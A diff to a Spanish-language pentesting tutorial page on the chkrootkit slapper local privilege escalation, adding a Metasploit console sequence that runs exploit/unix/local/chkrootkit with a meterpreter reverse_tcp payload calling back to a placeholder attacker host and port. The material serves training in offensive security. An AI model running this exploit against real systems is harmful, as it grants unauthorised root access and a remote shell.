@@ -94,5 +94,14 @@ La función slapper de chkrootkit, en versiones anteriores a la 0.50, no entreco
 
 Esta vulnerabilidad solo existe cuando `/tmp` no está montado con la opción `noexec`, ya que no permite la ejecución de binarios.
 
+```bash
+msf > use exploit/unix/local/chkrootkit
+[*] No payload configured, defaulting to cmd/unix/php/meterpreter/reverse_tcp
+msf exploit(unix/local/chkrootkit) > set chkrootkit /path/chkrootkit
+msf exploit(unix/local/chkrootkit) > set session id
+msf exploit(unix/local/chkrootkit) > set lhost ip_kali
+msf exploit(unix/local/chkrootkit) > set lport puerto_kali
+msf exploit(unix/local/chkrootkit) > run
+```
 
 [⟵ Anterior](06_win_privesc.md) | [Siguiente ⟶](08_persistencia.md)
